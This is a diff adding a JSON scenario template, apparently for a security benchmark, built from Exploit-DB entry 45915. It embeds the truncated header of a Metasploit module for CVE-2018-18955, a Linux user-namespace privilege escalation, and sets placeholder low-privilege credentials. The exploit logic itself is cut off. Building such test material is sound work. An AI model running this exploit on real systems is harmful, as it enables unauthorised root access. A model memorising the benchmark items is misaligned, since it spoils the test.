@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_45915",
+  "category": "",
+  "attack_technique": "",
+  "cwe": "",
+  "description": "Linux privilege escalation: Linux - Nested User Namespace idmap Limit Local Privilege Escalation (Metasploit) (CVE-2018-18955)\n\nExploit source code (45915.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Linux Nested User Namespace idmap Limit Local Privilege Escalation',\n      'Description'    => %q{\n        This module exploits a vulnerability in Linux kernels 4.15.0 to 4.18.18,\n        and 4.19.0 to 4.19.1, where broken uid/gid mappings between nested user\n        namespaces and kernel uid/gid mappings allow elevation to root\n        (CVE-2018-18955).\n\n        The target system must have unprivileged user namespaces enabled and\n        the newuidmap and newgidmap helpers installed (from uidmap package).\n\n        This module has been tested successfully on:\n\n        Fedora Workstation 28 kernel 4.16.3-301.fc28.x86_64;\n        Kubuntu 18.04 LTS kernel 4.15.0-20-generic (x86_64);\n        Linux Mint 19 kernel 4.15.0-20-generic (x86_64);\n        Ubuntu Linux 18.04.1 LTS kernel 4.15.0-20-generic (x86_64).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jann Horn', # Discovery and exploit\n          'bcoles'     # Metasploit\n        ],\n      'DisclosureDate' => 'Nov 15 2018',\n      'Platform'       => ['linux'],\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'Targets'        => [['Auto', {}]],\n      'Privileged'     => true,\n      'References'     =>\n        [\n          ['BID', '105941'],\n          ['CVE', '2018-18955'],\n          ['EDB', '45886'],\n          ['PACKETSTORM', '150381'],\n          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1712'],\n          ['URL', 'https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-18955'],\n          ['URL', 'https://lwn.net/Articles/532593/'],\n          ['URL', 'https://bugs.launchpad.net/bugs/1801924'],\n          ['URL', 'https://people.canonical.com/~ubuntu-security/cve/CVE-2018-18955'],\n          ['URL', 'https://security-tracker.debian.org/tracker/CVE-2018-18955'],\n          ['URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd'],\n          ['URL', 'https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.18.19'],\n          ['URL', 'https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.19.2']\n        ],\n      'DefaultTarget'  => 0,\n      'DefaultOptions' =>\n        {\n          'AppendExit'       => true,\n          'PrependSetresuid' => true,\n          'PrependSetreuid'  => true,\n          'PrependSetuid'    => true,\n          'PrependFork'      => true,\n          'WfsDelay'         => 60,\n          'PAYLOAD'          => 'linu\n```",
+  "cve": "CVE-2018-18955",
+  "exploitdb_id": "45915",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_45915",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
